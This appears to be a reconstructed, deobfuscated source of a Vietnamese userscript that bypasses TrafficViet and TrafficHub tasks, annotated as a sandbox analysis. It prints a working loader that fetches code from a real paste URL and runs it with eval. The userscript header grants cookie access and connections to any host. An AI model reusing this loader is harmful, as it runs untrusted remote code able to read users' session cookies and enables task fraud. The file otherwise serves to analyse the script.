// ============================================================================
//  RECONSTRUCTED ORIGINAL SOURCE — funcion.js (TrafficViet & TrafficHub Bypasser v1.0.0)
//  Khôi phục bằng: deobfuscate VM-lite (XOR + TEA strings) + xác thực hành vi trong sandbox.
//  Toàn bộ funcion.js (228 KB obfuscated) thực chất CHỈ là loader: fetch paste → eval.
//  (fetch logic nằm trong chuỗi TEA-mã hóa nên không thấy trong source tĩnh —
//   chỉ lộ khi chạy sandbox: fetch https://pastefy.app/sH0NUUgb/raw)
// ============================================================================

// ==UserScript==
// @name         TrafficViet & TrafficHub Bypasser - CUTTAY PROMAX
// @version      1.0.0
// @description  Bypass nhiệm vụ TrafficViet & TrafficHub tự động siêu tốc.
// @author       DuckXkurumi
// @icon         https://files.catbox.moe/8p9l8w.jpg
// @match        *://app.trafficviet.vn/*
// @match        *://system.traffichub.vn/*
// @grant        GM_xmlhttpRequest
// @grant        GM_cookie
// @connect      *
// @run-at       document-idle
// @require      https://duckxkurumi.xyz/bypass/trafficviet+traffichub/funcion.js
// @updateURL    https://duckxkurumi.xyz/bypass/trafficviet+traffichub/userscript.user.js
// @downloadURL  https://duckxkurumi.xyz/bypass/trafficviet+traffichub/userscript.user.js
// ==/UserScript==

// Bridging GM APIs sang scope thường (shim nằm đầu funcion.js)
(typeof GM !== "undefined") && Object.defineProperty(globalThis, "GM", { value: GM, writable: true, configurable: true });
// ... (tương tự cho GM_info, unsafeWindow, GM_getValue, GM_setValue, GM_xmlhttpRequest, GM_cookie ...)

// Loader duy nhất của funcion.js:
fetch("https://pastefy.app/sH0NUUgb/raw?t=" + Date.now())
  .then((response) => response.text())
  .then((code) => eval(code));   // → engine 297 KB (stage 2, chính là toàn bộ logic)

/* ============================================================================
 * CHUỖI TẢI (traffic chain):
 *   [0] userscript.user.js  (@match app.trafficviet.vn + system.traffichub.vn)
 *    └─ [1] funcion.js — 228 KB VM-lite (chuỗi TEA-encrypt runtime) — loader
 *         └─ [2] https://pastefy.app/sH0NUUgb/raw — 297 KB — ENGINE (2 tầng là hết)
 *
 * HÀNH VI ENGINE (trace sandbox, DOM giả):
 *  - Inject nút nổi "Mở Vnbypass - CUTTAY PROMAX" (logo "Delta",
 *    icon https://cdn.upanhlaylink.com/i/7LN0E0hl.ico) + link quảng cáo layma.net
 *  - Panel nhập "link nhiệm vụ" → resolve → toast "Đã sao chép link đích vào clipboard!"
 *  - Ô nhập "mã tìm được" → auto điền/nộp mã trên trang nhiệm vụ
 *  - Lắng nghe keydown / mousemove / mouseup, setTimeout 200 ms cho các bước tự động
 *  - Việc resolve link thật cần session/cookie của app.trafficviet.vn /
 *    system.traffichub.vn (GM_cookie được grant) → chỉ chạy đầy đủ trên trang thật.
 * ==========================================================================*/
